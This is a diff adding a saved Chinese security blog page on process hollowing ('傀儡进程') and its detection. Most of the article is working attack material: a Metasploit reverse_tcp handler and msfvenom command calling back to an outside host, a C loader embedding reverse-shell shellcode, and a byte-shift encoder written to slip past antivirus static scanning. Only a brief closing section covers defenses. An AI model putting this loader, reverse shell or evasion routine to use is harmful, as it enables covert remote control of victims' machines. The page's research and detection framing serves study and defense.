@@ -1,0 +1,889 @@
+
+
+<script type="text/javascript" src="http://7u2ss1.com1.z0.glb.clouddn.com/love.js"></script>
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+	<script src="http://echarts.baidu.com/dist/echarts.common.min.js"></script>
+	<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+    </style>
+
+
+    
+
+    <title>傀儡进程的实现与检测 | </title>
+    <meta name="author" content="wiki">
+    
+    <meta name="description" content="0x00 前言
+最近在安全动态推送中看到了一篇文章《RunPE: How to hide code behind a legit process》，介绍了将恶意代码注于已知进程的方法
+文章发布于2015年6月，虽然作者未公布完整的实现代码，但介绍了实现思路
+本文将结合自己的心得做进一步介绍，测试开源">
+    
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <meta property="og:title" content="傀儡进程的实现与检测"/>
+    <meta property="og:site_name" content="wiki"/>
+
+    
+    <meta property="og:image" content=""/>
+    
+
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <link rel="alternate" href="/atom.xml" title="wiki" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/lib/materialize.min.css">
+    <link rel="stylesheet" href="/css/lib/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+
+    
+        <link rel="stylesheet" href="/css/lib/lastest.css" type="text/css">
+    
+    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+</head>
+
+<style>
+
+</style>
+<body style="background-color:#2196f3">
+
+<script type="text/javascript"
+color="100,238,23" opacity='0.7' zIndex="-2" count="100" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+    <script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.15.0/TweenMax.min.js"></script>
+    <img src="/weixin_favicon.png" style="position: absolute; left: -9999px; opacity: 0; filter: alpha(opacity=0);">
+
+    <nav class="indigo darken-1">
+    
+    <div class="nav-wrapper">
+        <a href="#" data-activates="main-menu" class="button-collapse">
+            <i class="fa fa-navicon"></i>
+        </a>
+        <div class="">
+            <a href="/" class="brand-logo hide-on-med-and-down">wiki</a>
+            <ul class="right hide-on-med-and-down">
+                
+                    <li>
+                        <a class="menu-home " href="/" >
+                            <i class="fa fa-home "></i>
+                            
+                            首页
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-archive " href="/archives" >
+                            <i class="fa fa-archive "></i>
+                            
+                            归档
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                            <i class="fa fa-bookmark "></i>
+                            
+                            分类
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-search modal-trigger " href="#search" >
+                            <i class="fa fa-search "></i>
+                            
+                            搜索
+                        </a>
+                    </li>
+                
+            </ul>
+            <div>
+    <ul class="side-nav indigo darken-2" id="main-menu">
+        
+        <li class="side-user">
+            <div class="row">
+                <div class="col s4 no-padding">
+                    <img class="avatar-image circle responsive-img" src="http://p4gdp8beq.bkt.clouddn.com/timgsi1.jpg" alt="User Avatar">
+                </div>
+                <div class="info col s8 valign-wrapper no-padding">
+                    <div class="valign">
+                        <p class="name">wiki</p>
+                        <p class="desc">安全小白</p>
+                    </div>
+                </div>
+            </div>
+        </li>
+        
+
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-home " href="/" >
+                    <i class="fa fa-home "></i>
+                    
+                    首页
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-archive " href="/archives" >
+                    <i class="fa fa-archive "></i>
+                    
+                    归档
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                    <i class="fa fa-bookmark "></i>
+                    
+                    分类
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-search modal-trigger " href="#search" >
+                    <i class="fa fa-search "></i>
+                    
+                    搜索
+                </a>
+            </li>
+        
+    </ul>
+
+    <ul class="side-nav indigo darken-2" id="category-menu">
+    
+
+            
+
+    </ul>
+</div>
+
+        </div>
+    </div>
+</nav>
+
+<div id="search" class="modal search-modal">
+    <div class="row">
+        <div class="input-field col s12">
+              <input id="search-input" type="text">
+              <label for="search-input">搜索</label>
+        </div>
+
+    </div>
+    <div id="search-result" class="search-result col s12">
+
+    </div>
+</div>
+
+
+    <main>
+<div class="container main-container">
+    <script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https'){
+   bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else{
+  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<nav class="page-nav hide-on-small-only">
+    <div class="nav-wrapper indigo darken-2">
+        <span class="breadcrumb">当前位置（分类目录）</span>
+        
+            
+
+        
+
+        
+    </div>
+</nav>
+
+<article>
+    <div class="card">
+	<!-- 添加渲染 -->
+	<div id="toc" class="toc-article">
+		<strong class="toc-title"></strong>
+	</div> 
+        <div class="card-content">
+		  
+			
+            
+
+            <div class="article-title">
+                
+    
+        <h1>傀儡进程的实现与检测</h1>
+    
+
+
+            </div>
+            <time class="red-link-context" datetime="2018-05-25T13:03:44.774Z"><a href="">2018-05-25</a></time>
+
+            <span id="busuanzi_container_page_pv" class="read-times-container">
+    <i class="fa fa-eye"></i>
+    <span id="busuanzi_value_page_pv"></span>
+</span>
+
+            
+
+            <div class="toc red-link-context hide-on-med-and-down">
+    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x00-前言"><span class="section table-of-contents-text">0x00 前言</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x01-简介"><span class="section table-of-contents-text">0x01 简介</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x02-实现原理"><span class="section table-of-contents-text">0x02 实现原理</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#1、傀儡进程的选择"><span class="section table-of-contents-text">1、傀儡进程的选择</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#2、清空新进程的内存数据"><span class="section table-of-contents-text">2、清空新进程的内存数据</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#3、申请新的内存"><span class="section table-of-contents-text">3、申请新的内存</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#4、写入payload"><span class="section table-of-contents-text">4、写入payload</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#5、恢复环境"><span class="section table-of-contents-text">5、恢复环境</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x03-开源代码测试"><span class="section table-of-contents-text">0x03 开源代码测试</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x04-防御检测"><span class="section table-of-contents-text">0x04 防御检测</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x05-小结"><span class="section table-of-contents-text">0x05 小结</span></a></li></ol>
+</div>
+
+
+            <div class="entry red-link-context">
+                <script src="\assets\js\APlayer.min.js"> </script><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><hr>
+<p>最近在安全动态推送中看到了一篇文章《RunPE: How to hide code behind a legit process》，介绍了将恶意代码注于已知进程的方法</p>
+<p>文章发布于2015年6月，虽然作者未公布完整的实现代码，但介绍了实现思路</p>
+<p>本文将结合自己的心得做进一步介绍，测试开源实现代码，介绍防御方法</p>
+<p>文章地址：</p>
+<p><a href="https://www.adlice.com/runpe-hide-code-behind-legit-process/" target="_blank" rel="noopener">https://www.adlice.com/runpe-hide-code-behind-legit-process/</a></p>
+<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><hr>
+<p>本文将要介绍以下内容：</p>
+<ul>
+<li>实现原理</li>
+<li>开源代码测试</li>
+<li>优化思路</li>
+<li>防御检测</li>
+</ul>
+<h2 id="0x02-实现原理"><a href="#0x02-实现原理" class="headerlink" title="0x02 实现原理"></a>0x02 实现原理</h2><hr>
+<p>这个利用方法至少在2005以前就存在，国内常常把该方法称为”傀儡进程的创建”</p>
+<p><strong>实现思路：</strong></p>
+<ol>
+<li>通过CreateProcess创建进程，传入参数CREATE_SUSPENDED使进程挂起</li>
+<li>通过NtUnmapViewOfSection清空新进程的内存数据</li>
+<li>通过VirtualAllocEx申请新的内存</li>
+<li>通过WriteProcessMemory向内存写入payload</li>
+<li>通过SetThreadContext设置入口点</li>
+<li>通过ResumeThread唤醒进程，执行payload</li>
+</ol>
+<p>在具体实现上，还需要考虑以下问题：</p>
+<h3 id="1、傀儡进程的选择"><a href="#1、傀儡进程的选择" class="headerlink" title="1、傀儡进程的选择"></a>1、傀儡进程的选择</h3><p>如果傀儡进程已经运行，那么将无法实现替换(指针不可控、无法获得主线程句柄等)</p>
+<p>所以这种利用方法只能通过创建新进程，传入参数<code>CREATE_SUSPENDED</code>使进程挂起，在进程执行前对其替换</p>
+<h3 id="2、清空新进程的内存数据"><a href="#2、清空新进程的内存数据" class="headerlink" title="2、清空新进程的内存数据"></a>2、清空新进程的内存数据</h3><p>进程初始化后，内存会加载映像文件，为了清空新进程的内存数据，可以使用函数<code>NtUnmapViewOfSection</code>卸载映像</p>
+<p>函数<code>NtUnmapViewOfSection</code>需要从ntdll.dll获得，调用代码如下：</p>
+<pre><code>FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, &quot;NtUnmapViewOfSection&quot;);
+_NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)fpNtUnmapViewOfSection;
+DWORD dwResult = NtUnmapViewOfSection(pProcessInfo-&gt;hProcess, pPEB-&gt;ImageBaseAddress);
+</code></pre><p><strong>注：</strong></p>
+<p><code>NtUnmapViewOfSection</code>还能用来结束进程</p>
+<h3 id="3、申请新的内存"><a href="#3、申请新的内存" class="headerlink" title="3、申请新的内存"></a>3、申请新的内存</h3><p>使用<code>VirtualAllocEx</code>函数时，可以将傀儡进程的ImageBaseAddress作为申请空间的首地址，这样可以避免考虑“重定位”的问题</p>
+<h3 id="4、写入payload"><a href="#4、写入payload" class="headerlink" title="4、写入payload"></a>4、写入payload</h3><p>写入时，需要先比较payload和傀儡进程的ImageBaseAddress之间的偏移，如果存在偏移，需要进行重定位(使用.reloc区段)</p>
+<h3 id="5、恢复环境"><a href="#5、恢复环境" class="headerlink" title="5、恢复环境"></a>5、恢复环境</h3><p>替换前后需要保证寄存器正常，所以仅需要修改进程的入口点(即EAX寄存器)</p>
+<p>通过<code>GetThreadContext</code>获得所有寄存器的信息(保存在结构体_CONTEXT中)</p>
+<p>_CONTEXT的定义位于winnt.h，具体内容如下：</p>
+<blockquote>
+<p>typedef struct _CONTEXT {<br>    //<br>    // The flags values within this flag control the contents of<br>    // a CONTEXT record.<br>    //<br>    // If the context record is used as an input parameter, then<br>    // for each portion of the context record controlled by a flag<br>    // whose value is set, it is assumed that that portion of the<br>    // context record contains valid context. If the context record<br>    // is being used to modify a threads context, then only that<br>    // portion of the threads context will be modified.<br>    //<br>    // If the context record is used as an IN OUT parameter to capture<br>    // the context of a thread, then only those portions of the thread’s<br>    // context corresponding to set flags will be returned.<br>    //<br>    // The context record is never used as an OUT only parameter.<br>    //<br>    DWORD ContextFlags;<br>    //<br>    // This section is specified/returned if CONTEXT_DEBUG_REGISTERS is<br>    // set in ContextFlags.  Note that CONTEXT_DEBUG_REGISTERS is NOT<br>    // included in CONTEXT_FULL.<br>    //<br>    DWORD   Dr0;<br>    DWORD   Dr1;<br>    DWORD   Dr2;<br>    DWORD   Dr3;<br>    DWORD   Dr6;<br>    DWORD   Dr7;<br>    //<br>    // This section is specified/returned if the<br>    // ContextFlags word contians the flag CONTEXT_FLOATING_POINT.<br>    //<br>    FLOATING_SAVE_AREA FloatSave;<br>    //<br>    // This section is specified/returned if the<br>    // ContextFlags word contians the flag CONTEXT_SEGMENTS.<br>    //<br>    DWORD   SegGs;<br>    DWORD   SegFs;<br>    DWORD   SegEs;<br>    DWORD   SegDs;<br>    //<br>    // This section is specified/returned if the<br>    // ContextFlags word contians the flag CONTEXT_INTEGER.<br>    //<br>    DWORD   Edi;<br>    DWORD   Esi;<br>    DWORD   Ebx;<br>    DWORD   Edx;<br>    DWORD   Ecx;<br>    DWORD   Eax;<br>    //<br>    // This section is specified/returned if the<br>    // ContextFlags word contians the flag CONTEXT_CONTROL.<br>    //<br>    DWORD   Ebp;<br>    DWORD   Eip;<br>    DWORD   SegCs;              // MUST BE SANITIZED<br>    DWORD   EFlags;             // MUST BE SANITIZED<br>    DWORD   Esp;<br>    DWORD   SegSs;<br>    //<br>    // This section is specified/returned if the ContextFlags word<br>    // contains the flag CONTEXT_EXTENDED_REGISTERS.<br>    // The format and contexts are processor specific<br>    //<br>    BYTE    ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];<br>} CONTEXT;</p>
+</blockquote>
+<p>将寄存器EAX的值设置为起始地址，代码如下：</p>
+<pre><code>pContext-&gt;Eax = (DWORD)pPEB-&gt;ImageBaseAddress + pSourceHeaders-&gt;OptionalHeader.AddressOfEntryPoint;
+</code></pre><p>接着利用<code>SetThreadContext</code>写入，修改入口点</p>
+<p>通过<code>ResumeThread</code>唤醒进程，即可执行payload</p>
+<h2 id="0x03-开源代码测试"><a href="#0x03-开源代码测试" class="headerlink" title="0x03 开源代码测试"></a>0x03 开源代码测试</h2><hr>
+<p>实现傀儡进程的公开代码有很多，这里给出一个参考地址:</p>
+<p><a href="http://code.google.com/p/process-hollowing/downloads/list" target="_blank" rel="noopener">http://code.google.com/p/process-hollowing/downloads/list</a></p>
+<p>该工程的说明文档地址：</p>
+<p><a href="http://www.autosectools.com/process-hollowing.pdf" target="_blank" rel="noopener">http://www.autosectools.com/process-hollowing.pdf</a></p>
+<p>测试如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-30/3-1.png" alt="Alt text"></p>
+<p>如果需要查看内存数据，可以使用<a href="https://www.adlice.com/runpe-hide-code-behind-legit-process/中使用的工具：Process" target="_blank" rel="noopener">https://www.adlice.com/runpe-hide-code-behind-legit-process/中使用的工具：Process</a> Hacker</p>
+<p>参照上图的输出数据，image base为<code>0x00B90000</code></p>
+<p>查看新进程<code>0x00B90000</code>的数据，已经被成功替换为payload</p>
+<p>如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-30/3-2.png" alt="Alt text"></p>
+<p>继续下面的测试，参照源代码，修改payload为执行shellcode格式的Meterpreter</p>
+<p>server：</p>
+<pre><code>use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.81.192
+exploit
+</code></pre><p>Clinet：</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.81.192 LPORT=4444 -f c
+</code></pre><p>or</p>
+<pre><code>use windows/shell/reverse_tcp
+set LHOST 192.168.81.192
+generate -t c
+</code></pre><p>选择stage 1(281 bytes)即可</p>
+<p>生成shellcode后，HelloWorld工程实现执行shellcode功能的源代码如下：</p>
+<pre><code>#include &lt;windows.h&gt;
+int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow)
+{
+    unsigned char shellcode1[] =  
+        &quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30&quot;
+        &quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;
+        &quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52&quot;
+        &quot;\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1&quot;
+        &quot;\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b&quot;
+        &quot;\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03&quot;
+        &quot;\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b&quot;
+        &quot;\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24&quot;
+        &quot;\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb&quot;
+        &quot;\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c&quot;
+        &quot;\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68&quot;
+        &quot;\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x51\xc0\x68\x02&quot;
+        &quot;\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;
+        &quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61&quot;
+        &quot;\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2&quot;
+        &quot;\x56\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff&quot;
+        &quot;\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58&quot;
+        &quot;\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9&quot;
+        &quot;\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x75\xee\xc3&quot;;
+
+    typedef void (__stdcall *CODE) ();    
+    PVOID p = NULL;    
+    if ((p = VirtualAlloc(NULL, sizeof(shellcode1), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL)   
+        MessageBoxA(NULL, &quot;error&quot;, &quot;VirtualAlloc&quot;, MB_OK);    
+    if (!(memcpy(p, shellcode1, sizeof(shellcode1))))    
+        MessageBoxA(NULL, &quot;error&quot;, &quot;memcpy&quot;, MB_OK);    
+    CODE code =(CODE)p;       
+    code(); 
+
+    return 0;
+}
+</code></pre><p>执行ProcessHollowing.exe，加载HelloWorld.exe，弹回shell，如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-30/3-3.png" alt="Alt text"></p>
+<p>由于使用了Meterpreter，HelloWorld.exe会被杀毒软件静态查杀，这里做一个简单的加解密即可绕过</p>
+<p>对HelloWorld.exe逐字符作0x33加，源代码如下：</p>
+<pre><code>#include &lt;windows.h&gt;
+
+char *SoucePath = &quot;c:\\1\\HelloWorld.exe&quot;;
+char *DesPath = &quot;c:\\1\\test\\HelloWorld.exe&quot;;
+
+int _tmain(int argc, _TCHAR* argv[])
+{
+    HANDLE hFile = CreateFileA
+    (
+        SoucePath,
+        GENERIC_READ, 
+        0, 
+        0, 
+        OPEN_ALWAYS, 
+        0, 
+        0
+    );
+    if (hFile == INVALID_HANDLE_VALUE)
+    {
+        printf(&quot;Open file error\n&quot;);
+        return 0;
+    }
+    DWORD dwSize = GetFileSize(hFile, 0);
+    PBYTE pBuffer = new BYTE[dwSize];
+    DWORD dwBytesRead = 0;
+    ReadFile(hFile, pBuffer, dwSize, &amp;dwBytesRead, 0);
+    PBYTE pBuffer2 = new BYTE[dwSize];
+    PBYTE pBuffer3 = new BYTE[dwSize];
+    for(DWORD i=0;i&lt;dwSize;i++)
+    {
+        pBuffer2[i]=pBuffer[i]+0x33;
+    }
+/*
+    for(DWORD i=0;i&lt;dwSize;i++)
+    {
+        pBuffer3[i]=pBuffer2[i]-0x33;
+    }       
+*/  
+    HANDLE hFile2 = CreateFileA
+    (
+        DesPath,
+        GENERIC_WRITE, 
+        0, 
+        0, 
+        CREATE_ALWAYS, 
+        FILE_ATTRIBUTE_NORMAL, 
+        0
+    );
+    if (hFile2 == INVALID_HANDLE_VALUE)
+    {
+        printf(&quot;Create file error\n&quot;);
+        CloseHandle(hFile2);
+        return 0;
+    }
+    WriteFile(hFile2,pBuffer2,dwSize,&amp;dwSize,NULL);
+    CloseHandle(hFile2);
+    return 0;
+}
+</code></pre><p>输出新的加密文件HelloWorld.exe，不会被静态查杀</p>
+<p>ProcessHollowing工程添加一个解密操作，逐字符作0x33减，关键代码如下：</p>
+<pre><code>DWORD dwSize = GetFileSize(hFile, 0);
+PBYTE pBuffer = new BYTE[dwSize];
+PBYTE pBuffer2 = new BYTE[dwSize];
+DWORD dwBytesRead = 0;
+ReadFile(hFile, pBuffer2, dwSize, &amp;dwBytesRead, 0);
+for(DWORD i=0;i&lt;dwSize;i++)
+{
+    pBuffer[i]=pBuffer2[i]-0x33;
+}
+</code></pre><p>至此，完成静态查杀的绕过</p>
+<p><strong>注：</strong></p>
+<p>ProcessHollowing.exe行为拦截的绕过，本文暂不介绍</p>
+<h2 id="0x04-防御检测"><a href="#0x04-防御检测" class="headerlink" title="0x04 防御检测"></a>0x04 防御检测</h2><p>这种傀儡进程的利用，由于最开始创建了正常的进程，因此欺骗性很高</p>
+<p>例如创建傀儡进程calc.exe,进程的图标和描述都是正常的calc.exe，数字签名也正常</p>
+<p>如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-30/4-1.png" alt="Alt text"></p>
+<p><strong>防御方法：</strong></p>
+<ol>
+<li>使用杀毒软件，拦截函数SetThreadContext</li>
+<li>参考原文给出的建议，使用RogueKiller，对比PE文件在本地和内存之间是否有区别</li>
+</ol>
+<p>RogueKiller下载地址：</p>
+<p><a href="https://www.adlice.com/download/roguekiller/" target="_blank" rel="noopener">https://www.adlice.com/download/roguekiller/</a></p>
+<p>检测如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-30/4-2.png" alt="Alt text"></p>
+<h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><hr>
+<p>本文站在技术研究的角度，介绍了“傀儡进程”实现的原理，测试开源代码，给出防御检测的方法。虽然是很古老的技术，但其中的技术细节值得掌握。</p>
+<hr>
+<p><a href="https://github.com/3gstudent/feedback/issues/new" target="_blank" rel="noopener">LEAVE A REPLY</a></p>
+
+                
+<p class="red-link-context">
+    <a href="1330b86c.html" rel="next" title="TeamViewer 13.0.5058中的权限漏洞测试">
+    上一篇：TeamViewer 13.0.5058中的权限漏洞测试
+  </a>
+</p>
+
+
+
+<p class="red-link-context">
+    <a href="38632724.html" rel="next" title="渗透技巧——从github下载文件的多种方法">
+    下一篇：渗透技巧——从github下载文件的多种方法
+  </a>
+</p>
+
+
+            </div>
+			
+        </div>
+    </div>
+	
+</article>
+
+<!-- JiaThis Button BEGIN -->
+<div class="jiathis_style_32x32">
+	<a class="jiathis_button_qzone"></a>
+	<a class="jiathis_button_tsina"></a>
+	<a class="jiathis_button_tqq"></a>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_renren"></a>
+	<a href="http://www.jiathis.com/share?uid=2157721" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+	<a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript">
+var jiathis_config = {data_track_clickback:'true'};
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code_mini/jia.js?uid=2157721" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+<!-- ������City�氲װ���� -->
+<div id="lv-container" data-id="city" data-uid="MTAyMC8zNDIxOS8xMDc1Nw==">
+	<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+	</script>
+<noscript> Ϊ����ʹ�����������۹����뼤��JavaScript</noscript>
+</div>
+<!-- City�氲װ��������� -->
+
+ 
+</div>
+
+        <div class="fixed-action-btn float-sitemap">
+    <a class="btn-floating btn-large red">
+      <i class="fa fa-caret-square-o-up"></i>
+    </a>
+    <ul>
+      <li><a class="btn-return-top btn-floating waves-effect brown" title="回到顶部"><i class="fa fa-arrow-circle-o-up"></i></a></li>
+      <li><a class="btn-floating waves-effect button-collapse indigo"  data-activates="main-menu" title="菜单"><i class="fa fa-navicon"></i></a></li>
+    </ul>	
+  </div>
+	
+    </main>
+    
+  
+
+<script type="text/javascript" src="http://imagestp.cfyqy.com/cfyqy/pet/js/jquery.min.js"></script>
+<script type="text/javascript" src="http://imagestp.cfyqy.com/cfyqy/pet/js/spig.js"></script>
+<link rel="stylesheet" href="http://imagestp.cfyqy.com/cfyqy/pet/css/spigPet.css" type="text/css"/>
+<script type="text/javascript">
+var isindex = true;
+var visitor = true;
+</script>
+<div >
+<!--小人只在首页显示 start*-->
+<div id="spig" class="spig">
+    <div id="message">正在加载中……</div>
+    <div id="mumu" class="mumu"></div>
+</div>
+</div>
+<!--小人end*-->
+ 
+<footer class="page-footer indigo darken-1 darken-1">
+	
+    <div class="footer-container container">
+        <div class="row">
+            
+            <div class="social-group col m4 s12">
+                <h5 class="white-text">社交</h5>
+                
+                    <a class="social-link" href="" target="_blank">
+                        <i class="fa fa-2x fa-weibo"></i>
+                    </a>
+                
+                    <a class="social-link" href="" target="_blank">
+                        <i class="fa fa-2x fa-github"></i>
+                    </a>
+                
+                    <a class="social-link" href="/atom.xml" target="_blank">
+                        <i class="fa fa-2x fa-rss"></i>
+                    </a>
+                
+                
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+    <div class="site-visitors-container white-text">
+        <span>
+            <i class="fa fa-user"></i>
+            <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+        </span>
+        <span>&nbsp;|&nbsp;</span>
+        <span>
+            <i class="fa fa-eye"></i>
+            <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+        </span>
+    </div>
+
+
+            </div>
+            
+           
+            <div class="col m8 s12">
+                <h5 class="white-text">友情链接</h5>
+                
+                    <a class="social-link" href="http://www.itxueke.com/SecNavi/#3782" target="_blank">IT学客安全导航</a>
+                
+            </div>
+            
+        </div>
+    </div>
+    
+    <div class="footer-copyright red-link-context">
+        <div class="container">
+            © just do !
+        </div>
+    </div>
+	
+</footer>
+
+	
+
+<script>(function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/APP_ID.js","daovoice");</script>
+<script>
+  daovoice('init', {
+    app_id: "45fb937d",
+  });
+  daovoice('update');
+</script>
+  <noscript>
+    <div class="noscript">
+        <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+    </div>
+</noscript>
+<div class="noscript">
+    <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+</div>
+
+
+<script src="/js/jquery.min.js"></script>
+<script src="/js/materialize.min.js"></script>
+
+<script>
+    (function($) {
+        $(document).ready(function() {
+            // 隐藏禁用javascript（针对微信内置浏览器）的提示
+            $('.noscript').hide();
+
+            // 图片缩放效果
+            var $imgs = $('img').not('.slider-image').not('.avatar-image').not('.carousel-image').not('.card-cover-image').not('.qrcode');
+
+            // 给图片加上点击放大效果（materialbox插件）
+            $imgs.addClass('materialboxed').each(function(i, el) {
+                $(this).attr('data-caption', $(this).attr('alt') || ' ');
+            }).materialbox();
+
+            // 优化表格的显示
+            $('table').each(function() {
+                var $table = $(this);
+                // 除去多行代码的情况
+                if ($table.find('pre').length == 0) {
+                    $table.addClass('responsive-table striped bordered');
+                }
+            });
+
+            // 首页幻灯片
+            $('.slider').slider({indicators: true, full_width: true, interval: 8000});
+
+            $(".button-collapse").sideNav();
